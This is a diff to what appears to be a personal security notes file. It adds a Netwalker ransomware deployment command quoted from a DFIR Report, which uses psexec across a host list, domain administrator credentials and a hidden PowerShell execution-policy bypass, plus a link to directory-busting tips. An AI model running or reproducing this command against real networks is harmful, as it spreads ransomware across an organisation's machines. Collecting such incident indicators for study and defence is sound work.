@@ -1,5 +1,10 @@
 # notes 
 
+### The Money Shot - Netwalker Ransomware via DFIR Report
+````
+C:\psexec.exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\DomainController\DomainName /user:DomainName\administrator ThisWasThePassword &; powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -windowstyle hidden -NoExit -File q:\P100119.ps1”
+````
+
 ### Directory/File recon tricks via Georgiv again :heart:
 ![Dirbusting tips](EheFZJvVgAEuzZ1.png)
 
